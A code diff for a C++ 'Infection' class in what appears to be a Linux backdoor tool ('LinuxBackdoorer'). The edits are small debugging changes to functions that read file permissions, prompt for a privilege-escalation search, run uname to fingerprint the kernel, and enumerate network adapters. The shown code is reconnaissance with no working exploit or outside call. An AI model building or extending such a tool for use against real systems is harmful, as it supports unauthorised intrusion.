@@ -11,16 +11,6 @@ FileInformations Infection::GetFileInformations(const char* fileName){
 	infos.fileName = fileName;
 	printf("FileName = %s\n", fileName);
 	//File Permissions
-	//infos.filePermissions.append((S_ISDIR(fileMetaInformations.st_mode) ? "d" : "-"));
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IRUSR) ? "r" : "-");
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IWUSR) ? "w" : "-");
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IXUSR) ? "x" : "-");
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IRGRP) ? "r" : "-");
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IWGRP) ? "w" : "-");
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IXGRP) ? "x" : "-");
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IROTH) ? "r" : "-");
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IWOTH) ? "w" : "-");
-	//infos.filePermissions.append((fileMetaInformations.st_mode & S_IXOTH) ? "x" : "-");
 	infos.filePermissions[0] = ((S_ISDIR(fileMetaInformations.st_mode) ? 'd' : '-'));
 	infos.filePermissions[1] = ((fileMetaInformations.st_mode & S_IRUSR) ? 'r' : '-');
 	infos.filePermissions[2] = ((fileMetaInformations.st_mode & S_IWUSR) ? 'w' : '-');
@@ -53,7 +43,8 @@ void Infection::askForPrivilegeEscalation(){
 				break;
 			} else if(answer2PE == "NO" || answer2PE == "no" || answer2PE == "n" || answer2PE == "N"){
 				printf("[+] Skipping the search for Privilation Escalation Vectors !\n");
-				tryPrivilegeEscalation  = false;
+				//tryPrivilegeEscalation  = false;
+				printf("[+] Break");
 				break;
 			}
 		} else {
@@ -144,10 +135,10 @@ void Infection::GetLinuxVersion(){
 	const char* kernelReleaseErrorMessage = "[-] Failed to obtain Kernel Release";
 	const char* kernelReleaseSuccessMessage = "[+] Kernel Release :";
 	runLocalCommand("uname -r", kernelReleaseErrorMessage, kernelReleaseSuccessMessage, "KernelRelease");
-	//KernelVersion
-	const char* kernelFullErrorMessage = "[-] Failed to obtain Kernel Version";
-	const char* kernelFullSuccessMessage = "[+] Kernel Version :";
-	runLocalCommand("uname -v", kernelFullErrorMessage, kernelFullSuccessMessage, "KernelVersion");
+	//KernelVersion [Kind of useless right now]
+	//const char* kernelFullErrorMessage = "[-] Failed to obtain Kernel Version";
+	//const char* kernelFullSuccessMessage = "[+] Kernel Version :";
+	//runLocalCommand("uname -v", kernelFullErrorMessage, kernelFullSuccessMessage, "KernelVersion");
 	//Distribution Release Number
 	const char* distributionReleaseNumberErrorMessage = "[-] Failed to obtain Kernel Distribution Number";
 	const char* distributionReleaseNumberSuccessMessage = "[+] Kernel Release Number :";
@@ -174,7 +165,9 @@ bool Infection::startInfection(){
 	//GetLinuxVersion
 	FileInformations passwd;
 	passwd = Infection::GetFileInformations("LinuxBackdoorer");
+	Infection::write2File("TEST.txt", "I am making tests BOW !");
 	Infection::askForPrivilegeEscalation();
+	printf("[+] Get Linux Version");
 	Infection::GetLinuxVersion();
 	Networking::enumerateAdapters();
 	return true;
